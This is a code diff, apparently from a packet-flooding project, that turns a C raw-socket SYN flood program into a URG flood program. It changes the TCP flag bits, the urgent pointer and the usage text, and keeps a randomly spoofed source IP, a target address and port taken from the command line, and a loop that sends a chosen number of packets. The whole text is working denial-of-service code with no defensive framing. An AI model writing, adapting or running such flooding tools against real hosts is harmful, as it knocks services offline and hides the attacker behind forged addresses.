@@ -8,12 +8,12 @@
 
 int main(int argc,char* argv[]){
 	srand(time(NULL));
-    if(argc!=7){ fprintf(stdout,"Usage: syn-flood --remote-addr raddr --remote-port rport --n N"); exit(0); }
+    if(argc!=7){fprintf(stdout,"Usage: urg-flood --remote-addr raddr --remote-port rport --n N\n");exit(0);}
 	else{	
 		
 		/** Example source address and source port **/
 		char* source_address = generate_random_ip_v4();  // Randomize source_address for this flood //
-		char* source_port    = "1338";                   // Randomize port //
+		char* source_port    = "1388";                   // Randomize
 		char* remote_address = argv[2];
 		char* remote_port    = argv[4];
 		unsigned int iter    = atoi(argv[6]);
@@ -38,15 +38,15 @@ int main(int argc,char* argv[]){
 		/** Use auxiliar functions to warn of current status **/
 		SHOW_CREATED_IP_HEADER(ip_hdr);
 		
-		set_tcp_header(tcp_hdr,source_port,remote_port,0,0,TCP_DEFAULT_OFFSET,TCP_DEFAULT_RESERVED,0,1,0,0,0,0,0,0, \
-			       TCP_DEFAULT_WINDOW,0,0,buffer);
+		set_tcp_header(tcp_hdr,source_port,remote_port,0,0,TCP_DEFAULT_OFFSET,TCP_DEFAULT_RESERVED,0,0,0,0,0,1,0,0, \
+			       TCP_DEFAULT_WINDOW,1337,0,buffer);
 		
 		SHOW_CREATED_TCP_HEADER(tcp_hdr);
 
 		/** Notice the kernel that we doesn't need it fill the header **/
 		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
 		
-		/** Run your application type (Syn flood in this case)**/
+		/** Run your application type (URG Flood in this case) **/
 		run_flood(sock,iter,ip_hdr,&myaddr,buffer);
 	
 	
